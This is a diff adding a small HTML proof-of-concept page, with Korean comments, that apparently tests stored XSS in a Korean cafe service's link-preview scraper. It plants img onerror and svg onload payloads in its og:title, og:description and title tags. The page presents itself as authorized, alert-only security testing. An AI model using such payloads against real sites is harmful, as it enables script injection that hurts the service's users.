@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<!--
+  cafe 외부링크 스크랩 og:title XSS 테스트 페이지.
+  z3rotig4r.github.io 등 본인 서버에 올린 뒤, 이 URL을 카페 글쓰기에 첨부(링크프리뷰/스크랩 생성)하면
+  cafe가 아래 og:title(<img onerror>)을 긁어 scrap.titleHtml에 저장 → 조회 시 checkStoredXSS 통과 → 발화 여부 확인.
+  본인 계정/인가 테스트. alert만(무해).
+-->
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<!-- 핵심: og:title 에 XSS 페이로드 (oglink 서비스가 raw로 긁어감) -->
+<meta property="og:title" content='ZQXPOC<img src=x onerror=alert(document.domain)>'>
+<meta property="og:description" content='DESC<svg onload=alert(1)>'>
+<meta property="og:image" content='https://ssl.pstatic.net/static/nng/glive/icon.png'>
+<meta property="og:url" content='https://z3rotig4r.github.io/cafe_oglink/'>
+<!-- 폴백: <title> 도 페이로드 (일부 스크래퍼는 og 없으면 title 사용) -->
+<title>ZQXPOC&lt;img src=x onerror=alert(document.domain)&gt;</title>
+</head>
+<body>
+<h1>cafe oglink scrap XSS test</h1>
+<p>이 페이지의 og:title 에 XSS 페이로드가 있습니다. 카페 글에 이 URL을 첨부해 링크프리뷰를 생성하세요.</p>
+<p>프리뷰 제목이 <b>ZQXPOC</b> 뒤에서 발화하면(alert) = stored XSS 확정.</p>
+</body>
+</html>
